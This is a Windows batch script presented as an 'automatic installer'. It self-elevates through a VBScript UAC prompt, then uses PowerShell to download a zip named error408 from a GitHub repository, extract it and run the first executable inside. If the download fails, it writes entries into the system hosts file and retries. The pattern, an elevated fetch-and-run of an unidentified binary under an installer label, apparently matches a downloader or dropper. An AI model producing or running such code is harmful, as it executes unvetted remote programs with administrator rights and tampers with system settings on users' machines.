@echo off
title 自动安装程序

:: ========== 自动提权 ==========
net session >nul 2>&1
if errorlevel 1 (
    echo 正在请求管理员权限...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /b
)
:: ================================

:: 清理旧文件夹（避免文件占用）
if exist "%USERPROFILE%\Documents\error408\" (
    takeown /f "%USERPROFILE%\Documents\error408" /r /d y >nul 2>&1
    rmdir /s /q "%USERPROFILE%\Documents\error408" 2>nul
)

:: ========== 下载和安装 ==========
echo 正在下载...
powershell -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u='https://raw.githubusercontent.com/JYWYYHY/666/refs/heads/main/error408.zip';$d='%USERPROFILE%\Documents\error408.zip';$x='%USERPROFILE%\Documents\error408';try{(New-Object Net.WebClient).DownloadFile($u,$d);Write-Host '下载成功';Expand-Archive $d -Dest $x -Force;Write-Host '解压完成';$e=Get-ChildItem $x -Recurse -Include '*.exe'|Select-Object -First 1;if($e){Write-Host '启动:' $e.FullName;Start-Process $e.FullName -WorkingDirectory $e.Directory.FullName}}catch{Write-Host '下载失败:' $_.Exception.Message;exit 1}"

:: 如果下载失败，修改hosts后重试
if not exist "%USERPROFILE%\Documents\error408.zip" (
    echo.
    echo 下载失败，正在修复网络...
    
    findstr /i "raw.githubusercontent.com" C:\Windows\System32\drivers\etc\hosts >nul
    if errorlevel 1 (
        echo 185.199.108.133 raw.githubusercontent.com >> C:\Windows\System32\drivers\etc\hosts
        echo 185.199.109.133 raw.githubusercontent.com >> C:\Windows\System32\drivers\etc\hosts
        echo 185.199.110.133 raw.githubusercontent.com >> C:\Windows\System32\drivers\etc\hosts
        echo 185.199.111.133 raw.githubusercontent.com >> C:\Windows\System32\drivers\etc\hosts
    )
    
    ipconfig /flushdns >nul 2>&1
    echo 修复完成，重新尝试下载...
    timeout /t 2 >nul
    
    powershell -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u='https://raw.githubusercontent.com/JYWYYHY/666/refs/heads/main/error408.zip';$d='%USERPROFILE%\Documents\error408.zip';$x='%USERPROFILE%\Documents\error408';try{(New-Object Net.WebClient).DownloadFile($u,$d);Write-Host '下载成功';Expand-Archive $d -Dest $x -Force;Write-Host '解压完成';$e=Get-ChildItem $x -Recurse -Include '*.exe'|Select-Object -First 1;if($e){Write-Host '启动:' $e.FullName;Start-Process $e.FullName -WorkingDirectory $e.Directory.FullName}}catch{Write-Host '下载失败:' $_.Exception.Message;pause}"
)

echo.
echo ========================================
echo 下载和解压完成！
echo ZIP文件保留在: %USERPROFILE%\Documents\error408.zip
echo 解压目录: %USERPROFILE%\Documents\error408
echo ========================================
pause